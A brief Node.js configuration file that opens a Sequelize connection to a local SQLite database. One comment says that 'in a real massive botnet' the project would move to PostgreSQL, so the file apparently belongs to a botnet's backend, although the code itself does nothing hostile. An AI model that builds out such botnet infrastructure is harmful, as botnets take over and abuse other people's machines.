const { Sequelize } = require('sequelize');
const path = require('path');

// RUTHLESS: We are using SQLite for now because it's a single file and easy to backup.
// In a real massive botnet, we would switch this to PostgreSQL.
const sequelize = new Sequelize({
    dialect: 'sqlite',
    storage: path.join(__dirname, '../database.sqlite'),
    logging: false // Shut up the console logs, we only want errors
});

module.exports = sequelize;
